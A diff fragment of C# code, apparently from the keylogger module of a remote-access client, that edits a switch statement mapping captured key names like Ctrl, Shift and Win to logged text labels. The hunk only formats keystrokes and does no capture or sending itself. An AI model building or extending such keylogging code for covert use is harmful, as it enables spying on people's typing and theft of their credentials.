@@ -83,31 +83,10 @@ namespace Client.Handle_Packet
                                 currentKey = "[ENTER]\n";
                                 break;
                             case "Escape":
-                                //currentKey = "[ESC]\n";
-                                currentKey = "";
-                                break;
-                            case "LControlKey":
-                                //currentKey = "[CTRL]";
-                                currentKey = "";
-                                break;
-                            case "RControlKey":
-                                //currentKey = "[CTRL]";
-                                currentKey = "";
-                                break;
-                            case "RShiftKey":
-                                //currentKey = "[Shift]";
-                                currentKey = "";
-                                break;
-                            case "LShiftKey":
-                                //currentKey = "[Shift]";
                                 currentKey = "";
                                 break;
                             case "Back":
                                 currentKey = "[Back]";
-                                break;
-                            case "LWin":
-                                //currentKey = "[WIN]";
-                                currentKey = "";
                                 break;
                             case "Tab":
                                 currentKey = "[Tab]\n";
